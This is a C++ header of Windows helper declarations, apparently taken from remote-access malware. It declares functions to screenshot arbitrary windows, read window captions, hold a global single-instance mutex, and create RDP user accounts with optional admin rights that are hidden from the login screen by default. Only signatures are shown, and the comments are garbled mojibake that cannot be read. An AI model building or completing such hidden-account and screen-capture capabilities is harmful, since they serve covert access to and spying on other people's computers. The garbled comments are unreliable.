#pragma once

#include "core.h"

namespace Window
{
//���������� ����� ���������
int GetCaption( HWND hwnd, StringBuilder& s );
//���������� ����� ����� ������
int GetNameClass( HWND hwnd, StringBuilder& s );
//���������� ������ ����
HWND GetParent( HWND hwnd );
//���������� ������ �������� ������
HWND GetTopParent( HWND hwnd );
//���������� ���� ������ ������� ����� ���������
HWND GetParentWithCaption( HWND hwnd );

};

namespace Screenshot
{

bool Init();
void Release();

HBITMAP MakeBitmap( HWND hwnd );
bool MakeBmp( HWND hwnd,  Mem::Data& data );
bool MakePng( HWND hwnd, Mem::Data& data );
//����������: 0 - �������� �� ������� �������, 1 - ������ bmp, 2 - ������ png
int Make( HWND hwnd, Mem::Data& data );

}

namespace Users
{

//������� ������������ ��� ����������� �� RDP
//���� hidden = true, �� ��������� ���� �������� �� ����� � ������ ������
bool AddRemoteUser( const char* name, const char* password, bool admin = false, bool hidden = true );
//�������� ������������
bool Delete( const char* name );
HANDLE GetToken( const char* name );

}

namespace Mutex
{

//������� ������� � ��������� ������, ���������� ����� �������� ���� �� ��������, 0 - ���� ����� ������� ��� ����������
//������� ��������� � ������������ Global (Global\name)
HANDLE Create( const StringBuilder& name );
//���������� ������� 
void Release( HANDLE mutex );

}
